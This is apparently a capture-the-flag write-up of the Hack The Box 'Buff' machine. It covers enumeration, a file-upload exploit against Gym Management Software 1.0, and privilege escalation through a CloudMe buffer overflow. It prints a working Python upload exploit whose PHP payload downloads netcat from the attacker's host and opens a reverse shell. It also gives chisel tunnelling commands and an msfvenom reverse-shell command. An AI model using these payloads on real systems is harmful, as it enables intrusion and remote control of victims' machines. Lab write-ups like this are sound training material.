---
permalink: /portfolio/htb_windows/
author: Rick Theeuwes

defaults:
  # _pages
  - scope:
      path: ""
      type: pages
    values:
      layout: single
      author_profile: true
toc: true
title: Buff
---

# Linux Hack The Box Writeup for Buff

## Enumeration

As always, we start of with an nmap:

```bash
sudo nmap 10.10.10.198 -p 7680,8080 -sC -sV -oN nmap.txt
```

Before this command I ran `nmap 10.10.10.198 -p-` to get the ports 7680 and 8080. The flag `-sC` stands for default enum-scripts, and the `-sV` flag is for the version enumeration scripts. `-oN` states that all the text-results should be saved to the file named `nmap.txt`. 

With the result:

```bash
# Nmap 7.80 scan initiated Tue Sep  1 11:06:01 2020 as: nmap -p 7680,8080 -sC -sV -oN nmap.txt 10.10.10.198
Nmap scan report for 10.10.10.198 (10.10.10.198)
Host is up (0.091s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  1 11:07:12 2020 -- 1 IP address (1 host up) scanned in 71.03 seconds
```

I don't know what `pando-pub` is, so let's take a look at the website first. It appears to be Gym-management software.

![gym](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/htb/gym.png)

Alright, let's take a look around.

![contacts](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/htb/contact.png)

A software name and version, perfect! So, we are dealing with `Gym Management Software 1.0` here. That does not sound secure, let's see if anyone already found an exploit:

```bash
searchsploit Gym Management
```

![searchsploit](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/htb/searchsploit.png)

It appears a problem with filtering in a picture upload, in `upload.php`. If we put some image magic bytes in front of a php-script, it will accept it and we can run the php-script. Running the exploit found on exploit-db gives us this weird pseudo-shell, which sends a new request for every command. This is not usefull, so we have to edit it.

![pseudo](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/htb/psuedo.png)

So, I modified it to this:

```python
import requests, sys, urllib, re

if __name__ == "__main__":
        SERVER_URL = 'http://10.10.10.198:8080/'
        UPLOAD_DIR = 'upload.php?id=shel'
        UPLOAD_URL = SERVER_URL + UPLOAD_DIR
        s = requests.Session()
        s.get(SERVER_URL, verify=False)
        png     = {
                'file': 
                  (
                    'kaio-ken.php.png', 
                    '\x89\x50\x4e\x47\x0d\x0a\x1a \n <?php echo shell_exec("powerShell (New-Object System.Net.WebClient).DownloadFile(\'http://10.10.14.16/nc.exe\' \'nc.exe\'); 2>&1; ./nc.exe -e cmd.exe 10.10.14.16 8090"); ?>',
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
        }
        fdata   = {'pupload': 'upload'}
        r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
        print r1.text

```

This payload sends a file upload to the victim with a php-script. This script executes a `powershell` command, to download netcat (`nc.exe`) and execute it with `cmd.exe` to my kali. This generates a reverse shell and allows me to do much more.

## Exploitation

In order to execute the script, we navigate to `http://10.10.10.198:8080/upload/shel.php`, this executes the uploaded php-script and allows us to get the shell. We do need to have a python-webserver running so the victim can download netcat and we need to have a netcat listener to catch it.

![shell](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/htb/shell_win.png)

And there it is, a reverse shell!
This also gives us access to the `user.txt` file, located in `C:\Users\shaun\Desktop\user.txt`


## Privelege escaltion

So, how do we go from here? Well, after looking around shaun's home folder, I found `CloudMe_1112.exe` in his Downloads folder. This means that `Cloud Me` is installed, with version number `1112`, or `1_11_2`. This version is vulnerable to a buffer overflow.

![overflow](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/htb/overflow.png)

But, this is a python-based exploit, so we cannot run this on the victim. To run this exploit, we need a reverse proxy, so we can use the locally open port. I used (`chisel`)[https://github.com/jpillora/chisel] for the proxy.

```bash
#kali
./chisel server --port 9002 --reverse

#victim
powerShell (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.2/chisel.exe','C:\users\shaun\downloads\chisel.exe');
.\chisel.exe client 10.10.14.2:9002 R:8888:127.0.0.1:8888
```

Okay, now we have our reverse connection we can generate and run the exploit. We use the first exploit (`48389.py`), but we still need a payload for the victim to execute, let's generate that with `msfvenom`

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=8091 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
```

Still generates a byte-code payload for a reverse shell back to me. And after executing this we catch a shell on our listener!

![root](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/htb/root_win.png)

Done!
